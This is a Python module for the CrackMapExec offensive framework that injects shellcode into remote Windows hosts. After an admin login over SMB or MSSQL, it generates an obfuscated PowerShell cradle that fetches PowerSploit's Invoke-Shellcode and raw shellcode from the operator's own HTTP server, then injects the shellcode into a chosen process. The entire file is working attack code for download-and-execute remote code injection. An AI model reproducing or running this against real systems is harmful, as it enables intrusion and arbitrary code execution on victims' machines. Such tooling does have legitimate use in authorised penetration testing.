from cme.helpers.powershell import *
from sys import exit
import os

class CMEModule:
    '''
        Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'shellcode_inject'
    description = "Downloads the specified raw shellcode and injects it into memory"
    supported_protocols = ['mssql', 'smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            PATH     Path to the file containing raw shellcode to inject
            PROCID   Process ID to inject into (default: current powershell process)
        '''

        if not 'PATH' in module_options:
            context.log.error('PATH option is required!')
            exit(1)

        self.shellcode_path = os.path.expanduser(module_options['PATH'])
        if not os.path.exists(self.shellcode_path):
            context.log.error('Invalid path to shellcode!')
            exit(1)

        self.procid  = None

        if 'PROCID' in module_options.keys():
            self.procid = module_options['PROCID']

        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')

    def on_admin_login(self, context, connection):

        payload = """
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{shellcode}');
        Invoke-Shellcode -Force -Shellcode $bytes""".format(server=context.server,
                                                              port=context.server_port,
                                                              addr=context.localip,
                                                              shellcode=os.path.basename(self.shellcode_path))

        if self.procid:
            payload += ' -ProcessID {}'.format(self.procid)

        launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)

        connection.ps_execute(launcher, force_ps32=True)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Shellcode.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script.encode())

        elif os.path.basename(self.shellcode_path) == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(self.shellcode_path, 'rb') as shellcode:
                request.wfile.write(shellcode.read())

            #Target has the shellcode, stop tracking the host
            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()